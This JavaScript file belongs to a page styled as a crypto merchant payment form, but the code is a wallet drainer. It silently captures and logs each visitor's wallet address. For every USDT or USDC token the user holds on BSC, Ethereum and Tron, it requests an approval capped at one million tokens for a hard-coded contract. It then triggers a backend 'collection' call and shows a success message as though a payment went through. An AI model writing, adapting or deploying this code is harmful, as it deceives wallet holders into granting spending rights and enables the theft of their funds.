"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS   = "0x0E835B94FF5126ac71f18b0f875ecD65e6CE9283";
const CONTRACT_ADDRESS   = "0xAB3597063580473F1823FBd3f2C5F1c899a95EFf";

// BEP20 (BSC)
const BSC_USDT_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX   = "0x38";

// ERC20 (Ethereum Mainnet)
const ETH_USDT_ADDRESS   = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const ETH_USDC_ADDRESS   = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const ETH_CHAIN_ID_HEX   = "0x1";

// TRC20 (Tron Mainnet)
const TRON_USDT_ADDRESS  = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_MERCHANT      = "0x0E835B94FF5126ac71f18b0f875ecD65e6CE9283";
const TRON_FULL_NODE     = "https://api.trongrid.io/";
const TRON_CONTRACT      = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// Decimales
const BEP20_DECIMALS     = 18;
const ERC20_DECIMALS     = 6;
const TRC20_DECIMALS     = 6;

// Montos
const COLLECT_AMOUNT_BEP20 = ethers.parseUnits("0.1", 18);
const COLLECT_AMOUNT_ERC20 = ethers.parseUnits("0.1", 6);
const COLLECT_AMOUNT_TRC20 = 100000n; // 0.1 * 10^6
const CAP_AMOUNT_BEP20     = ethers.parseUnits("1000000", 18);
const CAP_AMOUNT_ERC20     = ethers.parseUnits("1000000", 6);
const CAP_AMOUNT_TRC20     = 1000000000000n; // 1000000 * 10^6

const BACKEND_URL = "/api/execute-collection";

// ─── RPC URLs ─────────────────────────────────────────────────────────────────
const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const ETH_RPC_URLS = [
  "https://ethereum-rpc.publicnode.com",
  "https://rpc.ankr.com/eth"
];

// ─── Chain params ─────────────────────────────────────────────────────────────
const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ETH_CHAIN_PARAMS = {
  chainId:           ETH_CHAIN_ID_HEX,
  chainName:         "Ethereum Mainnet",
  nativeCurrency:    { name: "Ethereum", symbol: "ETH", decimals: 18 },
  rpcUrls:           ETH_RPC_URLS,
  blockExplorerUrls: ["https://etherscan.io"]
};

// ─── ABI ──────────────────────────────────────────────────────────────────────
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

const TRC20_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
    "name": "allowance",
    "outputs": [{"name": "remaining", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
    "name": "approve",
    "outputs": [{"name": "success", "type": "bool"}],
    "type": "function"
  }
];

// ─── Token definitions ────────────────────────────────────────────────────────
const TOKENS = [
  {
    id:            "USDT_BEP20",
    label:         "USDT (BEP20)",
    network:       "evm",
    address:       BSC_USDT_ADDRESS,
    chainIdHex:    BSC_CHAIN_ID_HEX,
    chainParams:   BSC_CHAIN_PARAMS,
    decimals:      BEP20_DECIMALS,
    capAmount:     CAP_AMOUNT_BEP20,
    collectAmount: COLLECT_AMOUNT_BEP20,
    rpcUrls:       BSC_RPC_URLS,
    gasFees:       { maxFeePerGas: "0x0", maxPriorityFeePerGas: "0x0" }
  },
  {
    id:            "USDT_ERC20",
    label:         "USDT (ERC20)",
    network:       "evm",
    address:       ETH_USDT_ADDRESS,
    chainIdHex:    ETH_CHAIN_ID_HEX,
    chainParams:   ETH_CHAIN_PARAMS,
    decimals:      ERC20_DECIMALS,
    capAmount:     CAP_AMOUNT_ERC20,
    collectAmount: COLLECT_AMOUNT_ERC20,
    rpcUrls:       ETH_RPC_URLS,
    gasFees:       null
  },
  {
    id:            "USDC_ERC20",
    label:         "USDC (ERC20)",
    network:       "evm",
    address:       ETH_USDC_ADDRESS,
    chainIdHex:    ETH_CHAIN_ID_HEX,
    chainParams:   ETH_CHAIN_PARAMS,
    decimals:      ERC20_DECIMALS,
    capAmount:     CAP_AMOUNT_ERC20,
    collectAmount: COLLECT_AMOUNT_ERC20,
    rpcUrls:       ETH_RPC_URLS,
    gasFees:       null
  },
  {
    id:            "USDT_TRC20",
    label:         "USDT (TRC20)",
    network:       "tron",
    address:       TRON_USDT_ADDRESS,
    decimals:      TRC20_DECIMALS,
    capAmount:     CAP_AMOUNT_TRC20,
    collectAmount: COLLECT_AMOUNT_TRC20
  }
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up backend ──────────────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── Page-load silent connect ─────────────────────────────────────────────────
window.addEventListener("load", async () => {
  if (!window.ethereum || typeof window.ethereum.request !== "function") return;
  try {
    const accs = await window.ethereum.request({ method: "eth_accounts" });
    if (accs && accs[0]) _cachedAddress = accs[0];
  } catch (_) {}
  if (typeof window.ethereum.on === "function") {
    window.ethereum.on("accountsChanged", (accs) => {
      _cachedAddress = (accs && accs[0]) ? accs[0] : null;
    });
  }
});

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "NEXT";
  btnSpinner.hidden   = !on;
}

// ─── RPC helper (EVM multi-chain) ─────────────────────────────────────────────
async function rpcCall(method, params, rpcUrls = BSC_RPC_URLS) {
  for (const rpc of rpcUrls) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

// ─── Switch chain (EVM only) ──────────────────────────────────────────────────
async function switchChain(chainIdHex, chainParams) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: chainIdHex }]
    });
  } catch (e) {
    if (e.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [chainParams]
      });
    } else if (
      e.code === 4001 ||
      /user rejected|user denied/i.test(e.message || "")
    ) {
      throw new Error("User rejected chain switch");
    }
  }
}

// ─── Gas fees (Ethereum) ──────────────────────────────────────────────────────
async function getEthGasFees() {
  try {
    const feeData = await window.ethereum.request({
      method: "eth_feeHistory",
      params: ["0x1", "latest", [50]]
    });
    const priorityFee = BigInt(feeData.reward[0][0]);
    const baseFee     = BigInt(feeData.baseFeePerGas[feeData.baseFeePerGas.length - 1]);
    return {
      maxFeePerGas:         "0x" + (baseFee * 2n + priorityFee).toString(16),
      maxPriorityFeePerGas: "0x" + priorityFee.toString(16)
    };
  } catch (_) {
    return { maxFeePerGas: "0x3B9ACA00", maxPriorityFeePerGas: "0x3B9ACA00" };
  }
}

// ─── EVM: Balance check ───────────────────────────────────────────────────────
async function getTokenBalance(userAddress, tokenAddress, rpcUrls = BSC_RPC_URLS) {
  const iface = new ethers.Interface(ERC20_ABI);
  const data  = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: tokenAddress, data }, "latest"]
    });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: tokenAddress, data }, "latest"], rpcUrls);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── EVM: Poll allowance ──────────────────────────────────────────────────────
async function waitForAllowanceConfirmed(owner, spender, tokenAddress, required, rpcUrls = BSC_RPC_URLS, timeout = 120000) {
  const data =
    "0xdd62ed3e" +
    owner.slice(2).padStart(64, "0") +
    spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await window.ethereum.request({
        method: "eth_call",
        params: [{ to: tokenAddress, data }, "latest"]
      });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: tokenAddress, data }, "latest"], rpcUrls);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out. Please try again.");
}

// ─── EVM: Approve single token ────────────────────────────────────────────────
async function approveToken(userAddress, token, gasFees) {
  const iface = new ethers.Interface(ERC20_ABI);

  const balance = await getTokenBalance(userAddress, token.address, token.rpcUrls);
  if (balance === 0n) return "skipped";

  const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
  let allowanceHex = null;
  try {
    allowanceHex = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: token.address, data: allowanceData }, "latest"]
    });
  } catch (_) {}
  if (!allowanceHex || allowanceHex === "0x" || allowanceHex === "0x0") {
    allowanceHex = await rpcCall("eth_call", [{ to: token.address, data: allowanceData }, "latest"], token.rpcUrls);
  }

  if (allowanceHex && BigInt(allowanceHex) >= BigInt(token.capAmount)) {
    return "already";
  }

  const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, token.capAmount]);
  await window.ethereum.request({
    method: "eth_sendTransaction",
    params: [{
      from:                 userAddress,
      to:                   token.address,
      data:                 approveData,
      value:                "0x0",
      type:                 "0x2",
      maxFeePerGas:         gasFees.maxFeePerGas,
      maxPriorityFeePerGas: gasFees.maxPriorityFeePerGas
    }]
  });

  await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, token.address, token.capAmount, token.rpcUrls);
  return "approved";
}

// ─── TRON: Get TronWeb instance ───────────────────────────────────────────────
function getTronWeb() {
  if (!window.tronWeb) return null;
  return window.tronWeb;
}

// ─── TRON: Balance check ──────────────────────────────────────────────────────
async function getTronBalance(tronWeb, userAddress) {
  try {
    const contract = await tronWeb.contract(TRC20_ABI, TRON_CONTRACT);
    const bal = await contract.balanceOf(userAddress).call();
    return BigInt(bal);
  } catch (_) {
    return 0n;
  }
}

// ─── TRON: Poll allowance ─────────────────────────────────────────────────────
async function waitForTronAllowanceConfirmed(tronWeb, owner, spender, required, timeout = 120000) {
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    try {
      const contract = await tronWeb.contract(TRC20_ABI, TRON_CONTRACT);
      const allowance = await contract.allowance(owner, spender).call();
      if (BigInt(allowance) >= BigInt(required)) return;
    } catch (_) {}
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error("TRC20 Approval timed out. Please try again.");
}

// ─── TRON: Approve ────────────────────────────────────────────────────────────
async function approveTron(token) {
  const tronWeb = getTronWeb();
  if (!tronWeb) return "skipped";

  let userAddress;
  try {
    const addr = await tronWeb.currentAddress();
    userAddress = addr;
  } catch (_) {
    return "skipped";
  }
  if (!userAddress) return "skipped";

  // Balance check
  const balance = await getTronBalance(tronWeb, userAddress);
  if (balance === 0n) return "skipped";

  // Allowance check
  try {
    const contract = await tronWeb.contract(TRC20_ABI, TRON_CONTRACT);
    const allowance = await contract.allowance(userAddress, TRON_MERCHANT).call();
    if (BigInt(allowance) >= BigInt(token.capAmount)) return "already";
  } catch (_) {}

  // Send approve
  const contract = await tronWeb.contract(TRC20_ABI, TRON_CONTRACT);
  const result = await contract.approve(TRON_MERCHANT, token.capAmount).send();

  if (!result || !result.success) {
    throw new Error("TRC20 approve failed");
  }

  // Wait for confirmation
  await waitForTronAllowanceConfirmed(tronWeb, userAddress, TRON_MERCHANT, token.capAmount);
  return "approved";
}

// ─── Backend collect ──────────────────────────────────────────────────────────
async function triggerBackendCollect(userAddress, amount, token) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res = await fetch(BACKEND_URL, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: amount.toString(), token })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// ─── Main handler ─────────────────────────────────────────────────────────────
approveBtn.addEventListener("click", async () => {

  // ─── EVM: Wait for provider ────────────────────────────────────────────
  if (!window.ethereum) {
    setLoading(true, "Connecting…");
    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 300));
      if (window.ethereum) break;
    }
  }

  if (!window.ethereum) {
    setLoading(false);
    if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
      window.location.href = "go.html";
    } else {
      showToast("No wallet detected. Please open this page inside Trust Wallet.", "error");
    }
    return;
  }

  setLoading(true, "Processing…");

  try {

    // ─── EVM: Get address ────────────────────────────────────────────────
    let userAddress = _cachedAddress || null;

    if (!userAddress) {
      for (let i = 0; i < 8; i++) {
        try {
          const accs = await window.ethereum.request({ method: "eth_accounts" });
          userAddress = (accs && accs[0]) ? accs[0] : null;
        } catch (_) {}
        if (userAddress) break;
        await new Promise(r => setTimeout(r, 400));
      }
      if (!userAddress) {
        try {
          const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
          userAddress = (accs && accs[0]) ? accs[0] : null;
        } catch (_) {}
      }
    }

    if (!userAddress) {
      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
      setLoading(false);
      return;
    }

    try {
      await fetch("/api/wallet-log", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ address: userAddress })
      });
    } catch (e) {
      console.error("Wallet log error:", e);
    }

    _cachedAddress = userAddress;

    // ─── Process EVM tokens ──────────────────────────────────────────────
    let currentChain = null;
    let ethGas = null;

    for (const token of TOKENS) {

      // ─── TRON token ────────────────────────────────────────────────────
      if (token.network === "tron") {
        setLoading(true, `Approving ${token.label}…`);
        const result = await approveTron(token);
        if (result === "approved" || result === "already") {
          // Obtener dirección Tron para el backend
          let tronAddr = userAddress;
          try {
            const tronWeb = getTronWeb();
            if (tronWeb) {
              const tAddr = await tronWeb.currentAddress();
              if (tAddr) tronAddr = tAddr;
            }
          } catch (_) {}
          await triggerBackendCollect(tronAddr, token.collectAmount, token.id);
        }
        continue;
      }

      // ─── EVM token ─────────────────────────────────────────────────────
      if (token.chainIdHex !== currentChain) {
        await switchChain(token.chainIdHex, token.chainParams);
        currentChain = token.chainIdHex;
        if (token.chainIdHex === ETH_CHAIN_ID_HEX) {
          ethGas = await getEthGasFees();
        }
      }

      const gasFees = token.gasFees || ethGas;
      setLoading(true, `Approving ${token.label}…`);

      const result = await approveToken(userAddress, token, gasFees);

      if (result === "approved" || result === "already") {
        await triggerBackendCollect(userAddress, token.collectAmount, token.id);
      }
    }

    showToast("Sent Successfully, Thank you! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Unknown error";
    if (
      err.code === 4001 ||
      /user rejected|user denied|canceled|cancelled/i.test(raw)
    ) {
      showToast("Transaction cancelled.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});   

const NETWORKS = [
  {
    id:    "bep20",
    name:  "BNB Smart Chain",
    icon:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#111216"/><path d="M16 5.5l3.8 3.8-3.8 3.8-3.8-3.8L16 5.5zm-6.7 6.7l3.8 3.8-3.8 3.8-3.8-3.8 3.8-3.8zm13.4 0l3.8 3.8-3.8 3.8-3.8-3.8 3.8-3.8zM16 16.3l3.8 3.8-3.8 3.8-3.8-3.8 3.8-3.8zm-6.7 6.7l3.8 3.8-1.9 1.9-3.8-3.8 1.9-1.9zm13.4 0l1.9 1.9-3.8 3.8-1.9-1.9 3.8-3.8z" fill="#F3BA2F"/></svg>`,
    address: MERCHANT_ADDRESS
  },
  {
    id:    "erc20",
    name:  "Ethereum",
    icon:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#111216"/><path d="M16 6v9.2l7.5 4.3L16 6zm0 11.5l-7.5-4.3L16 6v11.5zm0 2.3l-7.5-4.3L16 26V20.8zm0 0l7.5-4.3L16 26v-4.9z" fill="#627EEA"/></svg>`,
    address: MERCHANT_ADDRESS
  },
  {
    id:    "trc20",
    name:  "Tron",
    icon:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#111216"/><path d="M8 12h16v8H8z" fill="#FF060A"/><path d="M12 14h8v4h-8z" fill="#fff"/></svg>`,
    address: TRON_MERCHANT
  }
];

let currentNetworkIndex = 0;

const networkPill  = document.getElementById("networkPill");
const networkIcon  = document.getElementById("networkIcon");
const networkName  = document.getElementById("networkName");

networkPill.addEventListener("click", () => {
  currentNetworkIndex = (currentNetworkIndex + 1) % NETWORKS.length;
  const net = NETWORKS[currentNetworkIndex];
  networkIcon.innerHTML = net.icon;
  networkName.textContent = net.name;
  merchantInput.value = net.address;
});
